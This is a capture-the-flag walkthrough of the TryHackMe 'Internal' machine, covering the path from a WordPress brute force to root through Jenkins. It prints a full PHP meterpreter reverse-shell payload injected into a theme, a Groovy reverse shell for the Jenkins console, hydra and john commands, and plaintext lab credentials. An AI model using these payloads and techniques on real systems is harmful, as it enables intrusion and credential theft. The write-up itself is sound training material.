## Introduction

The Internal host took almost 24 hours to complete due to the sheer number of pivots required to complete it. Unlike many of the other boot2roots I've completed on THM, this host required a significant amount of review and manual poking around on the host, above and beyond the results of automated enumeration tools like linPEAS. I thought it was incredibly brilliant machine.

## Environment

The attack takes place on a flat network consisting of the attack host, a freshly-booted Kali Linux livecd, and the target host. Information about the host was limited, however, I knew there would be two flags a user and root flag. It was also known that the host, known by the domain internal.thm, hosted a webserver and was the only host in scope.

## Attack

Prior to starting the attack, I prepared my workstation by setting up burpsuite, installing the certificates in firefox and defining the scope to include only the target host. I also opened msfconsole and configured it to connect to a postgres backend of msfdb. I also installed `jq`, [gobuster](https://github.com/OJ/gobuster) and the [seclists](https://github.com/danielmiessler/SecLists) wordlist collections. Finally I added `internal.thm` to my hosts file mapped to the target IP per the provide scope document.

### Host enumeration

I started the attack by running SYN version and OS scans against the host which identified only 2 open ports for ssh and http, and also confirming that this host was running linux.

```bash

```

To confirm that there was nothing else running on hidden ports, I ran a broader scan against all 65535 ports. I found that it returned nothing more that the above and have omitted the results for that reason.

### Investigating the webserver

I then decided to move to the webserver and, after opening up the site index, found that I was given the default apache page for ubuntu.

![webserver index page](/img/internal_http_index.png)

I assumed that there were more directories unlisted and decided to run `gobuster` with the `directory-list-2.3-medium.txt` wordlist to attempt to attempt to find anything else that could be sitting on the webserver.

```bash
root@kali:~/ctf# gobuster dir -u 'http://10.10.215.86' -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

I was lucky to find what looked like two potential paths forward, a blog running wordpress and a phpmyadmin panel. I decided to take the happy path aoproach and have a look at the blog to start.

### Investigating the wordpress blog

The wordpress blog appeared pretty bog-standard after opening the page, looking to be nothing more than a default install of wordpress.

![wordpress index](/img/internal_http_blog_index.png)

I browsed to a few common wordpress endpoints to confirm that it was that CMS and then chose to run `wpscan` against it to see if anything significant jumped out at me. Soon after, the scan identified that this was wordpress `5.4.2` but gave little else that was actionable for the attack.

With the scan turning up little, I decided to attempt to pull user information from the wordpress api endpoint before looking at other vectors.

```bash
root@kali:~/ctf# curl -sI http://10.10.215.86/blog/?author=1
HTTP/1.1 200 OK
Date: Sat, 05 Dec 2020 04:48:22 GMT

    "name": "admin",
    "url": "http://192.168.1.45/blog",
    "description": "",
    "link": "http://internal.thm/blog/index.php/author/admin/",
    "slug": "admin",
    "avatar_urls": {

      "96": "http://1.gravatar.com/avatar/77d33fec916329cf93f20054b38a86ce?s=96&d=mm&r=g"
    },
    "meta": [],
    "_links": {
      "self": [
        {
          "href": "http://internal.thm/blog/index.php/wp-json/wp/v2/users/1"
        }
      ],
      "collection": [
        {
          "href": "http://internal.thm/blog/index.php/wp-json/wp/v2/users"
        }
      ]
    }
  }
]
```

Luckily this gave me a username, `admin`, which I decided to attempt to bruteforce while I investigated other vectors.

### Bruteforcing the admin wordpress user

I pulled the `wp-login` post-form fields from burpsuite and crafted a hydra attack using the `rockyou.txt` wordlist for password parameters before stepping away to pour a cup of coffee.

```bash
root@kali:~/ctf# hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.215.86 http-post-form '/blog/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Finternal.thm%2Fblog%2Fwp-admin%2F&testcookie=1:is incorrect'

```

By the time I'd returned the bruteforce had yielded the password `my2boys` which I was able to confirm allowed me access to the admin panel.

![wordpress admin panel](/img/internal_http_wp_admin.png)

### Popping a shell through wp admin

With access to the admin panel, I decided to generate a reverse-tcp meterpreter shell that could be injected into the theme.

I generated a `php/meterpreter/reverse_tcp` shell using `msfvenom` and backed up the index.php theme template before replacing it with the following generated shellcode.

```bash
root@kali:~# msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.253.137 LPORT=4444
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 1114 bytes
/*<?php /**/ error_reporting(0); $ip = '10.10.253.137'; $port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();
```

![wordpress template injection](/img/internal_http_wp_shell_injection.png)

Prior to saving the theme, I prepped a listener in using the `exploit/multi/handler` module in metasploit to catch the new meterpreter session.

```bash
msf5 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > run -j
[*] Exploit running as background job 3.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.253.137:4444
```

I then refreshed the site index and prepared the `multi/manage/shell_to_meterpreter` module to migrate the incoming shell to a new process not attached to the php session.

```bash
msf5 post(multi/manage/shell_to_meterpreter) > 
[*] Sending stage (38288 bytes) to 10.10.215.86
[*] Meterpreter session 1 opened (10.10.253.137:4444 -> 10.10.215.86:58660) at 2020-12-05 05:33:03 +0000

```

Once this completed I killed the original session, and replaced the site index with it's original template, returning the site to its normal appearance.

### Enumerating the local user

Now that I had a shell, I started by running `linPEAS` to gain an initial impression of what else was running on the host.

```bash
msf5 post(multi/manage/shell_to_meterpreter) > use 2
[*] Starting interaction with 2...

meterpreter > getuid 
Server username: no-user @ internal (uid=33, gid=33, euid=33, egid=33)
meterpreter > cd /tmp/
meterpreter > upload /root/Desktop/PEASS/linPEAS/linpeas.sh
[*] uploading  : /root/Desktop/PEASS/linPEAS/linpeas.sh -> linpeas.sh
[*] Uploaded -1.00 B of 217.36 KiB (-0.0%): /root/Desktop/PEASS/linPEAS/linpeas.sh -> linpeas.sh
[*] uploaded   : /root/Desktop/PEASS/linPEAS/linpeas.sh -> linpeas.sh
meterpreter > shell 
Process 6521 created.
Channel 3 created.
chmod +x linpeas.sh
./linpeas.sh > internal_local_enum.txt
```

```bash
meterpreter > download internal_local_enum.txt
[*] Downloading: internal_local_enum.txt -> /root/ctf/internal_local_enum.txt
[*] Downloaded 124.65 KiB of 124.65 KiB (100.0%): internal_local_enum.txt -> /root/ctf//internal_local_enum.txt
[*] download   : internal_local_enum.txt -> /root/ctf//internal_local_enum.txt
```

I combed through the results and found that the host contained an additional unprivileged users with a shell, `aubreanna`, appeared to be running `docker`, appeared to be running a significant number of locally bound services and finally that the host appeared to be running jenkins as the `aubreanna` user with the assumption being that one of these locally bound services was the jenkins portal.

I decided to take a look in the `/var/jenkins_home/` directory to see if I could find any configuration for the jenkins host but found that it didn't exist, leading me to believe it running in a docker container. Similarly, I looked under `/etc/` and found nothing related to jenkins, finally I looked under `/opt/` and stumbled on a `/opt/wp-save.txt` file that netted a set of credentialls for the `aubreanna` user.

```bash
meterpreter > cd /opt
meterpreter > ls
Listing: /opt

Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123
meterpreter >
```

I attempted to login with the provided credentials via ssh and was pleased to receive a shell that quickly netted the user flag, confirmed that jenkins was running in docker and provided me a host/port pairing in the docker bridge network's subnet.

```bash

### Connecting to jenkins

Prior to starting enumeration of the aubreanna user, I decided to setup ssh port-forwarding so that I could easily connect back to the jenkins host that was bound to `127.0.0.1:8080`. Due to an already running conflict with burp, I bound it to port `8888` locally.

```bash
root@kali:~/ctf# ssh -L 8888:127.0.0.1:8080 -N -f aubreanna@10.10.215.86
aubreanna@10.10.215.86's password:
```

![jenkins login](/img/internal_http_jenkins_login.png)

### Enumerating the aubreanna user

I, again, uploaded linPEAS to the `aubreanna` users home directory and reran the scan to see if anything else turned up.

```bash
root@kali:~/ctf# sftp aubreanna@10.10.215.86
aubreanna@10.10.215.86's password: 

Permission denied, please try again.
aubreanna@10.10.215.86's password: 
Connected to 10.10.215.86.
sftp> put /root/Desktop/PEASS/linPEAS/linpeas.sh 
Uploading /root/Desktop/PEASS/linPEAS/linpeas.sh to /home/aubreanna/linpeas.sh
/root/Desktop/PEASS/linPEAS/linpeas.sh
```

```bash
aubreanna@internal:~$ ./linpeas.sh > aubreanna_local_enum.txt
```

But upon further inspection found that it confirmed a lot of information that I had already known. However, I remembered that the jenkins container was running under the same uid as aubreanna and I decided to see if I could access any of the filesystem through `/proc`. I attempted to navigate to the jenkins process and found that I was able to access the root of the of the namespace where I was quickly able to leak the jenkins admin credentials.

```bash
aubreanna@internal:/proc/1506/root$ ls

```

### Cracking the Jenkins admin credentials

I pulled the bcrypt hash from above and fed it into `john`, again running it against the `rockyou.txt` wordlist. Almost instantaneously it returned a collision for the password `spongebob`.

```bash
root@kali:~/ctf# echo 'admin:$2a$10$MDKawySp3DRfUrrKFrBAe.o2D4qCzIJJaPpRfc3u2CR/w.NzbJjqe' > jenkins_admin.txt

Created directory: /root/.john

Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

I validated I was able to login with this new set of credentials and was pleased to access the jenkins admin panel.

### Popping a shell in jenkins

While I had access to the jenkins filesystem, I decided to open a shell into the container via the groovy shell for further enumeration. I prepared another listener to catch the shell.

```bash
msf5 exploit(multi/handler) > run -j
[*] Exploit running as background job 5.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.253.137:4444 
```

I also prepared an example shell from [payload all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#groovy) which entered into the groovy script console of jenkins.

```bash
String host="10.10.253.137";
int port=4444;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

![groovy shell payload](/img/internal_http_jenkins_groovy_injection.png)

After executing the payload I caught the response on my new listener and migrated it using the `shell_to_meterpreter` module which gave me a second open meterpreter session on the host.

```bash
msf5 exploit(multi/handler) > [*] Command shell session 3 opened (10.10.253.137:4444 -> 10.10.215.86:57730) at 2020-12-05 06:16:05 +0000

Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:tr0ub13guM!@#123
```

This, much to my surprise, ended up yielding a set of root credentials which I could have, ironically, obtained without going through all the trouble of popping another shell.

### Root shell

With the new root credentials, I `su`'d from my aubreanna shell and quickly found the final root flag in `root.txt`.

```bash
aubreanna@internal:~$ su -
Password: 
root@internal:~# ls
root.txt  snap
```

## Summary

I don't think this walkthrough faithfully captured the amount of time that I'd spent poking around at each level of local enumeration. In my first run through, I'd spent a significant amount of time walking through directories externally on blog, internally in the blog's webroot as well as within the mysql database and phpmyadmin panels. This was repeated after popping a shell in the extensive time spent walking through service configurations and poking at the locally-bound services. It wasn't until I'd slowed down and started looking for out of place files that I'd stumbled on the `notes.txt` file in `/opt`.
